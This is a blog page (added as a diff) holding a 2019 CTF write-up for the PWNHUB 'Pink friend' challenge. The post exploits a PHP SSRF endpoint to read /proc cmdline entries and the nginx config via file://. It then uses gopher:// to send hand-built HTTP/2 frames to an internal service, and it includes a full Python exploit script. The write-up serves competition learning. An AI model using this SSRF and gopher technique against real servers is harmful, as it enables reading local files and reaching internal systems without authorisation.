@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <title>PWNHUB / Pink friend - Virink's Blog</title>
+  <meta name="author" content="Virink">
+  <meta name="keywords" content="Virink,技术博客,CTF,Writeup,代码审计,AUDIT,pwnhub,writeups">
+  <meta name="description" content="Virink的小站,记录杂文与分享一些技术文章">
+  <!-- css files -->
+  <link href="/static/css/default.min.css" rel="stylesheet">
+  
+<link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/monokai-sublime.min.css" rel="stylesheet">
+<style>
+    .markdown-body code {
+        background-color: #23241f;
+    }
+</style>
+
+  <!-- favicon icon files -->
+  <link rel="icon" type="image/x-icon" href="/static/img/favicon.ico">
+  <link rel="icon" href="/static/img/favicon.ico">
+  <!-- rss atom file -->
+  <link rel="alternate" href="/atom.xml" title="Virink's Blog" type="application/atom+xml">
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+  <!-- Chrome 食用最佳，本主题于Chrome下开发，不适配其他浏览器 -->
+</head>
+<body>
+  <div class="wrapper">
+    <header>
+      <div class="header">
+        <img src="/static/img/logo.png" alt="Virink's Blog logo" />
+        <p ><a href="/" class="title">Virink's Blog</a></p>
+        <p class="subtitle">Let life be beautiful like summer flowers, and death like autume leaves.</p>
+      </div>
+      <!-- Social -->
+      <!-- Social -->
+<div class="social">
+  <!-- RSS Atom -->
+  <li class="social__item">
+    <a href="https://www.virzz.com/atom.xml" title="Virink's RSS">
+      <i class='fa fa-rss'></i>
+      <span class="label">RSS</span>
+    </a>
+  </li><!-- Github -->
+  <li class="social__item">
+    <a href="https://github.com/virink" title="Virink's GitHub">
+      <i class='fa fa-github'></i>
+      <span class="label">GitHub</span>
+    </a>
+  </li><!-- Twitter -->
+  <li class="social__item">
+    <a href="https://twitter.com/virinkz" title="Virink's Twitter">
+      <i class='fa fa-twitter'></i>
+      <span class="label">Twitter</span>
+    </a>
+  </li><!-- Telegram -->
+  <li class="social__item">
+    <a href="https://telegram.me/virink" title="Virink's Telegram">
+      <i class='fa fa-paper-plane'></i>
+      <span class="label">Telegram</span>
+    </a>
+  </li></div>
+      <!-- Nav -->
+      <nav>
+          <li><a href="/">首页</a></li>
+          <li><a href="/tags">标签</a></li>
+          <li><a href="/archives">归档</a></li>
+          <li><a href="/links">友链</a></li>
+      </nav>
+    </header>
+
+    <!-- Main panel -->
+    <div class="content">
+    
+    <div class="content-wrap">
+        <article class="article animated fadeIn">
+            <div class="article-title">
+                <i class="fa fa-book"></i>&nbsp;<a href="/2019/01/29/pwnhub_2019_pink_friend_http2.html">PWNHUB / Pink friend</a>
+            </div>
+            <div class="article-tag">
+                
+                <div class="article-tag-item">
+                    <a href="/tags/pwnhub/"><i class="fa fa-tag"></i>pwnhub</a>
+                </div>
+                
+                <div class="article-tag-item">
+                    <a href="/tags/writeups/"><i class="fa fa-tag"></i>writeups</a>
+                </div>
+                
+            </div>
+            <div class="article-meta">
+                <div class="article-date">
+                    <i class="fa fa-calendar"></i>&nbsp;<time datetime="2019-01-29 03:03:24">2019-01-29 03:03:24</time>
+                </div>
+            </div>
+            <!-- <div class="clearfix"></div> -->
+            <section class="article-content markdown-body">
+                <h2>Challenge</h2>
+<p><strong>What is Peppa Pig？</strong></p>
+<ul>
+<li>参赛时间：2019.01.28 20:00 - 2019.01.30 20:00</li>
+<li>参与人数：72</li>
+</ul>
+<p>想知道胖哥特制的佩奇里有什么秘密吗？<br />
+快来一起玩耍吧！<br />
+祝大家新春快乐，“猪”事顺意！</p>
+<p>https://40.73.33.181/</p>
+<pre><code class="php">&lt;?php
+show_source(__FILE__);
+
+if(isset($_GET['url'])){
+    $url = parse_url($_GET['url']);
+    if(!$url){
+        die('Can not parse url: '.$_GET['url']);
+    }
+    $ch = curl_init();
+    curl_setopt ($ch, CURLOPT_URL, $_GET['url']);
+    curl_exec($ch);
+    curl_close($ch);
+}
+?&gt;
+</code></pre>
+
+<h2>Analysis</h2>
+<h3>Step 1 What&rsquo;s the point?</h3>
+<p>When open this site, we can see the source code of PHP.</p>
+<p><strong>$_GET[&lsquo;url&rsquo;]</strong> and <strong>curl</strong></p>
+<p>Year, it&rsquo;s SSRF.</p>
+<h3>Step 2 Read something</h3>
+<p><strong>CmdLine is very important</strong></p>
+<pre><code class="python">for i in range(1, 30):
+    print(i)
+    pl = 'file:///proc/%d/cmdline' % i
+    r = ssrf(pl)
+    print(r)
+</code></pre>
+
+<p>Result:</p>
+<ul>
+<li>bash /start.sh</li>
+<li>nginx: master process /usr/sbin/nginx</li>
+<li>nginx: worker process</li>
+</ul>
+<p><strong>Maybe should read the default configuration and log file for Nginx</strong></p>
+<ul>
+<li>/etc/nginx/nginx.conf</li>
+<li>/etc/nginx/sites-enabled/default</li>
+<li>/var/log/nginx/access.log;</li>
+<li>/var/log/nginx/error.log</li>
+<li>&hellip;etc</li>
+</ul>
+<p><strong>Some information in /etc/nginx/nginx.conf</strong></p>
+<pre><code class="conf">    #server {
+    #   listen 8080
+    #   location /flag {
+    #       proxy_pass 172.20.0.3:8080
+    #   }
+    #}
+</code></pre>
+
+<h3>Step 3 Request 172.20.0.3:8080</h3>
+<p>WTF?! It&rsquo;s so terrible!</p>
+<p><code>b'\x00\x00\x12\x04\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x80\x00\x04\x00\x01\x00\x00\x00\x05\x00\xff\xff\xff\x00\x00\x04\x08\x00\x00\x00\x00\x00\x7f\xff\x00\x00\x00\x00\x08\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01'</code></p>
+<p>I don&rsquo;t know what it is!!!</p>
+<p>Encrypted?</p>
+<p>Maybe should test ssl or others?</p>
+<h3>Step 4 Analyze Request and Response message</h3>
+<p><code>curl -vv -k 'https://40.73.33.181/?url=http://172.20.0.3:8080/'</code></p>
+<pre><code>*   Trying 40.73.33.181...
+* TCP_NODELAY set
+* Connected to 40.73.33.181 (40.73.33.181) port 443 (#0)
+* ALPN, offering h2
+* ALPN, offering http/1.1
+...
+* ALPN, server accepted to use h2
+...
+* Using HTTP2, server supports multi-use
+* Connection state changed (HTTP/2 confirmed)
+* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0
+* Using Stream ID: 1 (easy handle 0x7fefcb000400)
+&gt; GET /?url=http://172.20.0.3:8080/ HTTP/2
+&gt; Host: 40.73.33.181
+&gt; User-Agent: curl/7.54.0
+&gt; Accept: */*
+&gt;
+* Connection state changed (MAX_CONCURRENT_STREAMS updated)!
+&lt; HTTP/2 200
+&lt; server: nginx/1.14.0 (Ubuntu)
+&lt; date: Mon, 28 Jan 2019 19:37:43 GMT
+&lt; content-type: text/html; charset=UTF-8
+&lt;
+&lt;code&gt;...
+* Connection #0 to host 40.73.33.181 left intact
+&lt;/code&gt;���
+</code></pre>
+
+<p>It use HTTP2.0</p>
+<h3>Step 5 Analyze Frame</h3>
+<p>I found <strong>hyper</strong> through ***(Search Engines)</p>
+<p>Then parse the response data in <strong>Step 3</strong></p>
+<pre><code>SettingsFrame(Stream: 0; Flags: None): 00030000008000040001...
+WindowUpdateFrame(Stream: 0; Flags: None): 7fff0000
+GoAwayFrame(Stream: 0; Flags: None): 0000000000000001
+</code></pre>
+
+<p>Good Job! </p>
+<h3>Step 6 Learn about HTTP2</h3>
+<p><strong>You should learn something about http2</strong></p>
+<ul>
+<li>Frame<ul>
+<li>header - parse_frame_header</li>
+<li>body - parse_body</li>
+</ul>
+</li>
+<li>SettingsFrame<ul>
+<li>settings</li>
+</ul>
+</li>
+<li>HeadersFrame<ul>
+<li>flags<ul>
+<li>END_STREAM</li>
+<li>END_HEADERS</li>
+</ul>
+</li>
+<li>data<ul>
+<li>struct</li>
+<li>hpack<ul>
+<li>encode</li>
+<li>decode</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>&hellip;etc</li>
+</ul>
+<h3>Step 7 Request by Gopher</h3>
+<p><code>gopher://172.20.0.3:8080/_</code> + <em>HTTP/2 Connection Preface</em> + <em>HTTP Frames</em> [ +<em>HTTP Frames</em> ]</p>
+<p><strong>eg.</strong></p>
+<pre><code>gopher://172.20.0.3:8080/_PRI%2520%252A%2520HTTP/2.0%250D%250A%250D%250ASM%250D%250A%250D%250A%2500%2500%251E%2504%2500%2500%2500%2500%2500%2500%2501%2500%2500%2500%25FF%2500%2502%2500%2500%2500%2500%2500%2503%2500%2500%2500%2505%2500%2504%2500%2500%2500%25FF%2500%2506%2500%2500%2500%25FF%2500%2500%2515%2501%2505%2500%2500%2500%2501%2582%2586%2584A%258A%2508%259D%255C%250B%2581p%25DCx%250F%2503%2560%2581%25EFS%2581%25F9
+</code></pre>
+
+<h3>Step 8 Get Flag</h3>
+<p>flag{Http2_Mak3_a_Differ3nce}</p>
+<h2>Exp.py</h2>
+<pre><code class="python">#!/usr/bin/env python3
+# -*- coding:utf-8 -*-
+from urllib.parse import *
+from hpack import Encoder, Decoder
+&quot;&quot;&quot;
+    Author : Virink &lt;virink@outlook.com&gt;
+    Date   : 2019/01/28, 23:23
+&quot;&quot;&quot;
+
+import requests
+import urllib3
+from hyperframe.frame import *
+urllib3.disable_warnings()
+
+URL = 'https://40.73.33.181'
+
+req = requests.Session()
+req.verify = False
+req.cert = False
+
+
+def ssrf(url):
+    url = URL+&quot;/?url=&quot;+url
+    print(&quot;[+] Request -&gt; %s&quot; % url)
+    res = req.get(url)
+    try:
+        if res.status_code == 200:
+            html = res.content.decode('utf-8')
+            return html[html.find('&lt;/code&gt;')+7:]
+    except Exception as e:
+        return res.content[res.content.find(b'&lt;/code&gt;')+7:]
+
+
+def genFrame(data):
+    next_f = 0
+    errn = 0
+    while len(data) &gt; next_f+9:
+        print(&quot;[*] &quot;+&quot;-&quot;*30)
+        if errn &gt; 2:
+            break
+        try:
+            nframe, _len = Frame.parse_frame_header(
+                data[next_f:next_f+9])
+            nframe.parse_body(memoryview(data[next_f+9:next_f+9 + _len]))
+            print(&quot;[+] Frame -&gt; %s&quot; % nframe)
+            for i in nframe.__dict__:
+                if i == 'data':
+                    print(&quot;[+] Data:&quot;)
+                    print(&quot;[✔️] &quot;, Decoder().decode(nframe.data))
+                    print(&quot;[+] &quot;)
+            next_f += _len + 9
+        except Exception as e:
+            print(e)
+            errn += 1
+            next_f += _len + 9
+            continue
+
+
+def parseFrame(path):
+    frames = []
+    f = SettingsFrame(0)
+    # f.settings = {
+    #     f.HEADER_TABLE_SIZE: 0xff,
+    #     f.ENABLE_PUSH: 0,
+    #     f.MAX_CONCURRENT_STREAMS: 5,
+    #     f.INITIAL_WINDOW_SIZE: 0xff,
+    #     f.MAX_HEADER_LIST_SIZE: 0xff
+    # }
+    frames.append(f.serialize())
+    f = HeadersFrame(1)
+    f.flags.add('END_STREAM')
+    f.flags.add('END_HEADERS')
+    header_data = [
+        (':method', 'GET'),
+        (':scheme', 'http'),
+        (':path', '/'+path),
+        (':authority', '127.0.0.1:8080'),
+        ('cookie', 'v'),
+        ('accept', '*')
+    ]
+    f.data = Encoder().encode(header_data)
+    frames.append(f.serialize())
+    data = b''.join(frames)
+    return quote(data)
+
+
+if __name__ == '__main__':
+    # cmdline
+    # for i in range(1, 30):
+    #     print(ssrf('file:///proc/%d/cmdline' % i))
+    # nginx.conf
+    # print(ssrf('file:///etc/nginx/nginx.conf'))
+    # 172.20.0.3:8080
+    pl = 'gopher://172.20.0.3:8080/_'
+    # 连接序言 PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n
+    pl += quote(quote('PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'))
+    # 帧 Frames[]
+    pl += quote(parseFrame(''))
+    genFrame(ssrf(pl))
+</code></pre>
+            </section>
+            <div class="article-copyright">
+              <span>本文标题&nbsp;:&nbsp;</span><a href="/2019/01/29/pwnhub_2019_pink_friend_http2.html" target="_blank">PWNHUB / Pink friend</a><br />
+              <span>文章作者&nbsp;:&nbsp;</span><a href="https://www.virzz.com" target="_blank">Virink</a><br />
+              <span>发布时间&nbsp;:&nbsp;</span><i class="fa fa-calendar"></i>&nbsp;<time datetime="2019-01-29 03:03:24">2019-01-29 03:03:24</time><br />
+              <span>最后更新&nbsp;:&nbsp;</span><i class="fa fa-calendar"></i>&nbsp;<time datetime="2019-01-30 20:18:38">2019-01-30 20:18:38</time><br />
+              <span>本文链接&nbsp;:&nbsp;</span><a href="https://www.virzz.com/2019/01/29/pwnhub_2019_pink_friend_http2.html" title="PWNHUB / Pink friend" target="_blank">https://www.virzz.com/2019/01/29/pwnhub_2019_pink_friend_http2.html</a><br />
+              <span>转载声明&nbsp;:&nbsp;</span><i class="fa fa-creative-commons"></i>转载请保留原文链接及作者。<br />
+              <span>转载说明&nbsp;:&nbsp;</span><i class="fa fa-exclamation-circle"></i>本卡片有模板生成，本人转载来的文章请忽略~~
+            </div>
+        </article>
+        <!-- <div class="toc" data-toc="h2,h3,h4,h5,h6"></div> -->
+        <div class="toc" data-toc="h2" data-tocContainer="section"></div>
+    </div>
+
+    </div>
+
+    <!-- Footer Panel -->
+    <footer class="footer">
+      <center>
+        <span class="footer__copyright">&copy; 2018-2019. | ❤ <a href="mailto:virink@outlook.com"> Virink </a> | 由 <a href="https://github.com/virink/MweBlog">MWEBLOG</a> 强力驱动 | 主题<a href="https://github.com/virink/MweBlog">concise</a></span>
+        <span>本站採用<i class="fa fa-creative-commons"></i><a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"知识共享 署名-非商业性使用-禁止演绎 4.0 国际 许可协议"</a></span>
+        </center>
+    </footer>
+
+  </div>
+  <!-- js files -->
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/script/js/jquery.min.js"%3E%3C/script%3E'))</script>
+  
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/MathJax.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/github-repo-widget/e23d85ab8f/jquery.githubRepoWidget.min.js"></script>
+<script src="/static/js/toc.min.js"></script>
+<script>
+    $(document).ready(function(){
+        // highlight
+        $('code').each(function(i, block) {
+            hljs.highlightBlock(block);
+        });
+        // MathJax
+        MathJax.Hub.Config({ 
+            tex2jax: {inlineMath: [['[latex]','[/latex]'], ['\\(','\\)']]} 
+        });
+    });
+</script>
+
+  <!-- Analytics Google -->
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-83885261-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'UA-83885261-1');
+</script>
+<!-- Analytics Baidu -->
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?8e6156c342669e24891a8ed34161d84a";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+</body>
+</html>
